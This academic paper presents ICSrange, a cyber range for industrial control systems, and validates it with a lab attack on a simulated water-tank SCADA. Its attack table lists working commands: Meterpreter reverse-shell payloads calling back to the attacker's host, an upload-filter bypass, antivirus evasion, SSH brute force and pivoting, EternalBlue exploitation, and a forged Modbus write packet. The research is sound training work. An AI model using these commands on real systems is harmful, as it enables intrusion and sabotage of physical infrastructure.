ICSrange: A Simulation-based Cyber Range
Platform for Industrial Control Systems

Vincenzo Giuliano
Department of Engineering
University of Naples Parthenope
Naples, Italy
vincenzo.giuliano@studenti.uniparthenope.it

Valerio Formicola
Department of Engineering
University of Naples Parthenope
Naples, Italy
valerio.formicola@uniparthenope.it

Abstract—Maintenance staff of Industrial Control Systems
(ICS) is generally not aware about information technologies,
and even less about cyber security problems. The scary im-
pact of cyber attacks in the industrial world calls for tools
to train defensive skills and test effective security measures.
Cyber range offers this opportunity, but current research is
lacking cost-effective solutions verticalized for the industrial
domain. This work proposes ICSrange, a simulation-based cyber
range platform for Industrial Control Systems. ICSrange adopts
Commercial-Off-The-Shelf (COTS) technologies to virtualize an
enterprise network connected to Industrial Control Systems.
ICSrange is the outcome of a preliminary study intended to
investigate challenges and opportunities to build a conﬁgurable
and extensible cyber range with simulated industrial processes.
Literature shows that testbeds based on realistic mock-ups are
effectively employed to develop complex exploits like Advanced
Persistent Threats (APTs), hence motivating their usage to train
and test security in ICS. We prove the effectiveness of ICSrange
through the execution of a multi-staged attack that breaches
an enterprise network and progressively intrudes a simulated
ICS with water tanks. The attack mimics lateral movements as
observed in APTs.

Index Terms—cyber range, SCADA, cyber-security, Advanced

Persistent Threat

I. MOTIVATION

As industrial control systems (ICS) adopt information tech-
nologies, maintenance staff has to be more and more aware
about cyber security. In an unprecedented way the conse-
quences of a cyber-attack can be catastrophic for the physical
world. This emergency calls for cost-effective and replicable
methods to grow the expertise and skills of cyber-defense
teams, and this is generally done using cyber testbeds or
cyber ranges [1]. Cyber ranges are virtual hardware and
software environments that recreate enterprise networks and
interconnected systems1,2. The objective of a cyber range is
to provide a legal and controlled environment for training and
testing skills and methods for cyber-security [2]. In this work
we present ICSrange, a simulation-based cyber range platform
for Industrial Control Systems (ICS). ICSrange is the outcome
of a preliminary study intended to investigate challenges

1NIST and NICE, ”Cyber ranges,” 2018, https://www.nist.gov/sites/

default/ﬁles/documents/2018/02/13/cyber ranges.pdf

2D. Lohrmann, ”Cyber Range: Who, What, When, Where, How and
Why?,” 2018, https://www.govtech.com/blogs/lohrmann-on-cybersecurity/
cyber-range-who-what-when-where-how-and-why.html

and opportunities to build a cost-effective, conﬁgurable and
extensible cyber range with simulated industrial processes.
Literature shows that testbeds based on realistic mock-ups are
effectively employed by hackers to develop complex exploits
like Advanced Persistent Threats (APTs)3, hence motivating
their usage to train and test security in ICS [3]. Even if not
exhaustive, cyber training is extremely important in the process
of maintaining a required level of security.

The prototype of ICSrange adopts Commercial-Off-The-
Shelf (COTS) platforms and open-source technologies,
to
recreate 1) multiple servers connected in an enterprise net-
work, i.e., gateways, web-servers, login nodes, 2) a production
Industrial Control System based on a Supervisory Control
And Data Acquisition (SCADA) system, 3) industrial network
communications, i.e., Modbus communication among PLCs,
4) network segments such as a Demilitarized Zone (DMZ),
an intermediate network, a SCADA network, 5) data sources
from the ICS and from the enterprise nodes. ICSrange is
deployed on virtual machines. Current version of ICSrange
is partially conﬁgurable in terms of security features, e.g., the
difﬁculty to breach some nodes based on patched vulnerabil-
ities, the adjustable isolation of industrial network segments,
the complexity of the simulated physical process. As compared
to other works [4], ICSrange relies on the simulation and
customization of variously complex SCADA processes -with
real network communications,- which makes it extremely cost-
effective and portable. We prove the effectiveness of ICSrange
through a multi-staged attack that breaches an enterprise
network and progressively intrudes a simulated ICS with water
tanks. The attack mimics lateral movements as observed in
APTs.

ICSrange has to serve for the following objectives:

1) Providing cyber training of penetration skills for Red
Teams, i.e., professional hackers employed by organi-
zations to challenge their own defensive capabilities by
assuming an adversarial role on purpose.

2) Improving defensive methods and practices for Blue
Teams. For example, the enterprise security team can test

3KasperskyLab, Threat

automation sys-
tems, March 2019, https://ics-cert.kaspersky.com/reports/2019/03/27/threat-
landscape-for-industrial-automation-systems-h2-2018/

landscape

industrial

for

intrusion detection and prevention systems, server con-
ﬁgurations, connections, access policies, and response
and mitigation actions.

3) Researching for advanced methodologies for cyber-
security. As an example,
installing security sensors
and log collectors, researchers can develop data-driven
methods to monitor the security posture of industrial
networks.

4) Planning advanced reaction and risk mitigation plans
for Industrial Control System, through the simulation
of SCADA processes. Simulation of inter-dependent
systems enable the assessment of the impact of attacks
against physical controls, and allows to forecast cascad-
ing effects.

Section 2 shows the architecture of ICSrange prototype and
a validation through a multi-staged attack. Section 3 provides
observations and describes future works.

Disclaimer The software used in this preliminary work is
used under personal or academic license, and is not intended
to be distributed. The vulnerabilities and exploits indicated in
this work are public and known.

II. ICSRANGE ARCHITECTURE AND
PROOF-OF-CONCEPT

ICSrange emulates a segmented enterprise network and an

Industrial Control System (ICS) based on SCADA.

A. Enterprise and ICS Network

The enterprise network (Figure 1) hosts 1) a ﬁrewall gate-
way, 2) a web-server –installed in a demilitarized zone– to
manage staff proﬁles and photos, 3) a bastion login node
to control accesses from the enterprise network towards the
industrial control system, 4) the industrial control system
network with a SCADA MTU and a PLC that gathers data
from sensors, actuators, and valves.

The

Linux

ﬁrewall

Firewall Gateway

gateway
(192.168.10.1)4 has three network interfaces managed with
IPTables to accept http requests from the Internet towards
the web-server (192.168.5.2) hosted in a a demilitarized zone
(DMZ). It also accepts SSH connections from the DMZ to
the Login node (10.0.0.2).

Web-server The web-server is based on DVWA, a XAMPP
web-server designed with vulnerabilities conﬁgurable with
difﬁculty from low to impossible. The host is a Microsoft
Windows 7 OS with two users, an admin (SuperUser) and
a regular user (WebServer).

Industrial Network Login Node A Linux machine with an
ssh server, to bridge the 10.0.0.0 network towards the 100.0.0.0
network (SCADA network).

SCADA MTU/PLC MASTER The workstation to manage
the ICS is based on a free version of Promotic PLC 8.35 on
a Microsoft Windows 7 OS. The MTU machine (100.0.0.3)
hosts also the SCADA HMI to visualize the process.

4Note we used only private IP addresses having the cyber range working

in a controlled and private testbed.

Fig. 1. Architecture of the ICS cyber range.

RTU/PLC SLAVE The PLC machine (100.0.0.5) simulates
the acquisition of parameters from 4 minor water tanks and a
main tank, and one valve actuator controlled from the PLC.
The PLC node is simulated using the Modbus PLC Simulator6,
installed on a Windows 7 machine.

Figure 3 shows details of the SCADA system. Simulation is
restricted to the physical process -a set of water pipelines and
tanks- and sensors/actuator equipment. The actuator regulates
the acquisition of water from the 4 smaller tanks. Real Modbus
communications are established among the PLC controllers.

B. Attacker Tools

Nmap is a GNU/GPL tool for network exploration. It is used
to scan active hosts on a network, active services, OS versions
(ﬁngerprinting).

Wireshark is a software for network packet analysis and
sniffer, able to dissect the content of packets online or ofﬂine.
It is compatible with pcap packet format.

Metasploit is a software platform for penetration testing.
Metasploit Framework is a collection of tools and modules
updated regularly to enable penetration tests with most recent
codes and exploits. Metasploit is able to verify the vulnerabil-
ity of the target for a selected malicious code, to conﬁgure the
malicious code for the attack (attack payload) and to encrypt
the exploit to evade intrusion prevention systems.

Meterpreter is an advanced payload for Metasploit which
loads malicious DLL code using a stager (to create re-
verse/bind TCP connections) to create a session from the
attacker node to the victim machine, and inject the exploit
into the target memory.

Kali Linux is a free Linux distribution with penetration
testing tools above (and more). In our testbed Kali is installed
on an enterprise external node 192.168.10.2.

C. Execution of Multi-staged Attack Against the ICS

A proof-of-concept of ICSrange is done executing a multi-
staged attack, that aims at quality degradation in the Industrial
Control System via illicit alteration of the SCADA system. We
recreated part of the stages carried out in typical Advanced

5https://www.promotic.eu/en/pmdoc/PriceList/PmFree.htm

6http://www.plcsimulator.org/

Fig. 2. Attack progression against the ICS. Unobservable events are carried out on the attacker resources, thus not visible on the victim machines.

TABLE I
PROGRESSION OF TARGETED ATTACK AGAINST THE WATER TANK SCADA SIMULATED IN ICSRANGE

Attack
Step

Commands/Actions

0

1

2

2/3

4

4

5

6

7

8

9

10

Intrusion on ﬁrewall/router 192.168.10.2

Scan of network addresses on the router interfaces
nmap -Pn -O 192.168.5.0/24; nmap -Pn -O 10.0.0.0/24
prepare a ”index.php” ﬁle with malicious code:
msfvenom -p php/meterpreter/reverse tcp LHOST=192.168.10.2 LPORT=4444
-f raw >image.php
•Install and conﬁgure BURP proxy on the local Kali browser
•Try upload new image.php on the web-server form (POST http)
•Intercept the POST and change context-type from ”application/php” to ”image/jpg”
•Malicious code is uploaded
•Install ”exploit/multi/handler” module on meterpreter on port 4444
•Reverse TCP and meterpreter access:
GET http://192.168.5.2/dvwa/hackable/uploads/image.php
•Information Gathering: SuperUser administrator found
•Create a new malware to establish a foothold on Windows (encrypted to bypass antivirus):
msfvenom -p windows/meterpreter/reverse tcp LHOST=192.168.10.2 LPORT=4444
-e x86/shikata ga nai -i 5 -f exe >load.exe
•Transfer the ﬁle load.exe in the Meterpreter session: upload load.exe
•Execute load.exe to start a new reverse TCP session
•Use Metasploit to exploit ”ms14 058 track popup menu” vulnerability to escalate privileges
•Brute force: hydra -l SuperUser -P ’dictionary ﬁlepath’ -t 8 10.0.0.2 ssh
•Information Gathering: ifconﬁg shows network 100.0.0.1 (not reachable from Kali)
•SSH PIVOTING (forward Kali local connections to 9050 towards 10.0.0.2):
ssh -D 127.0.0.1:9050 -N SuperUser@10.0.0.2
•Use the proxy PROXYCHAINS to forwards toward the ICS network:
conﬁgure proxychains.conf on 9050 for SOCKS5
•Scan the ICS network using nmap through the proxy
(ports pre-investigated/known for Modbus):
proxychains -nmap -sT -Pn -n -v -p 80,443,445 100.0.0.0/24
•Infer active IPs observing longer timeout expiration:
100.0.0.3, 100.0.0.5 supposed active and conﬁrmed on port 445
•Fingerprinting of 100.0.0.3 and 100.0.0.5:
proxychains nmap -Pn -sT -A -p 1-1000 100.0.0.3
proxychains nmap -Pn -sT -A -p 1-1000 100.0.0.5
•Scan vulnerability EternalBlue of Windows OS using Metasploit and execute exploit:
use auxiliary/scanner/smb/smb ms17 010 ethernalblue;
set payload windows/x86/meterpreter/bind tcp (as opposed to reverse tcp);
set RHOST 100.0.0.3; exploit;
•Run screengrabber module: use espia
•Migrate the meterpreter process on an ActiveDesktop process
(e.g., explorer.exe with pid 1336): migrate 1336
•Take a screenshot of the SCADA desktop: screengrab
•Run packet snifﬁng, show interfaces (2 for the local eth) and save a pcap ﬁle:
use capture.cap; sniffer interfaces; sniffer start 2;
•Analyse the Modbus pcap on Kali (e.g., Wireshark):
100.0.0.3 and 100.0.0.5 exchange Modbus packets
Register 4 on 100.0.0.3 contains 0/1 values. Possible COIL actuator (on/off switch)
•Craft malicious Modbus packets (2 approaches):
Method 1: use auxiliary/scanner/scada/modbusclient
set action WRITE REGISTERS; set DATA ADDRESS 4; set DATA REGISTERS 0; run;
Method 2: create a tool that sends Modbus payloads over TCP to switch register 4 to 0:
01 55 00 00 00 09 01 10 00 04 00 01 02 00 00
Continue to grab screenshots from the SCADA server

Target

ﬁrewall/
router

DMZ

web-server

Result

access to router
network interfaces
found http on a Win7
host 192.168.5.2
•malicious code
•image upload error:
format not accepted

web-server

•reverse tcp executed
•SuperUser found
•backdoor for foothold
•privilege escalated

ICS network
login node
(SSH)

•Login node control
•ICS information
gathering

ICS network
login node

direct access to ICS
network

ICS nodes
(SCADA MTU
/PLC)

•ICS network discovery
•Windows OS versions
running the SCADA

SCADA MTU

take over
the MTU host

SCADA MTU

collect data and
information from
SCADA target

SCADA MTU
/PLC

build knowledge
on the target system

SCADA PLC

unexpected variation
of physical parameters
in the Industrial Control
System

SCADA MTU

spy SCADA status

Fig. 3. Simulation-based SCADA system with water tanks.

Persistent Threats (APT) [3]. The attack causes an ICS that
controls a water tank to switch off and unexpectedly become
empty, as showed in the two screenshots in the Figure 2,
with two Human Machine Interfaces (HMIs) of the SCADA,
before and after the attack. The progression line indicates the
steps followed by the attacker who advances through a series
of lateral movements among the machines connected within
the target infrastructure. Unobservable events encompass those
activities carried out by the attackers to understand the oper-
ational processes in the ICS, and are particularly scary since
not carried out within the boundaries of the enterprise network.
The speciﬁc violations and malicious commands are reported
in the Table I step-by-step. Note the attack exploits mostly
disclosed vulnerabilities7,8 before proceeding to the ﬁnal step
of the attack to the SCADA, which is instead very speciﬁc for
the targeted ICS. To alter the state of the industrial process,
ﬁrst (step 8) the attacker studies the industrial process through
HMI screen capture, Modbus communication snifﬁng, and data
exﬁltration actions. Then, the attacker forges packets (step
9) that contain fake Modbus data tailored against the PLC
Register 4 (Figure 4) that controls the water tank switch.

III. OBSERVATIONS AND FUTURE WORK

Cyber range is employed for team building, cyber training,
capture the ﬂag (CTF), research and development, testing,
assessment, and recruitment. The wide spectrum of objectives
requires an extensible and conﬁgurable platform. The devel-
opment of the ICSrange prototype presents a higher degree of
complexity with respect to the emulation of pure Information
Technology (IT), because of the need to recreate an integrated
Operational Technology (OT) in action. We envision many
challenges for the further specialization of this application.
The most compelling challenge for ICS cyber range in gen-
eral is to provide an accurate simulation of cyber-physical
infrastructures, because of the limited realism of industrial
control models obtained from widely-used simulation pack-
ages. Limitation is also related to the complexity to emulate
hardware components and software stacks from major vendors

7https://www.exploit-db.com/
8https://www.rapid7.com/

Fig. 4. Modbus packets analysed, and malicious packet replayed.

of industrial controls. In the future, development efforts will be
devoted to the conﬁguration of: 1) multiple network segments,
2) installed services, 3) exploitable vulnerabilities, i.e., patches
and updates, 4) roles and active users, 5) access controls,
6) deployed security mechanisms, i.e., intrusion protection
and detection, anti-viruses, security information and event
management (SIEM) systems, 7) scenarios of maintenance
operations, 8) business activity monitors. The OT layer will be
conﬁgured for: 1) complexity of simulated physical process,
e.g., chemical, water, energy, 2) scale, e.g., Building Automa-
tion System, geographic area control, 3) communications, e.g.,
DNP3, Modbus, etc. Additionally, we will consider various
CTF goals, e.g., altering software execution, data exﬁltration,
targeted variation of quality ﬁgures in the industrial process.
Finally, we will investigate the trade-off between emulated
scenarios and scalability of the virtual set-ups. We will make
ICSrange completely open and based on free technologies.

ACKNOWLEDGMENT

The research leading to these results has received funding
from the European Commission within the context of the
Horizon2020 Programme under Grant Agreement No. 833088
(INFRASTRESS), and No. 740712 (COMPACT) projects.

REFERENCES

[1] J. Davis and S. Magrath, “A survey of cyber ranges and testbeds,”
tech. rep., Defence Science And Technology Organisation Edinburgh
(Australia) Cyber And Electronic Warfare Div., 2013.

[2] V. E. Urias, W. M. Stout, B. Van Leeuwen, and H. Lin, “Cyber range
infrastructure limitations and needs of tomorrow: A position paper,”
in 2018 International Carnahan Conference on Security Technology
(ICCST), pp. 1–5, IEEE, 2018.

[3] A. Alshamrani, S. Myneni, A. Chowdhary, and D. Huang, “A survey
on advanced persistent threats: Techniques, solutions, challenges, and
research opportunities,” IEEE Communications Surveys & Tutorials,
2019.

[4] B. Hallaq, A. Nicholson, R. Smith, L. Maglaras, H. Janicke, and K. Jones,
“Cyran: a hybrid cyber range for testing security on ics/scada systems,”
in Cyber Security and Threats: Concepts, Methodologies, Tools, and
Applications, pp. 622–637, IGI Global, 2018.

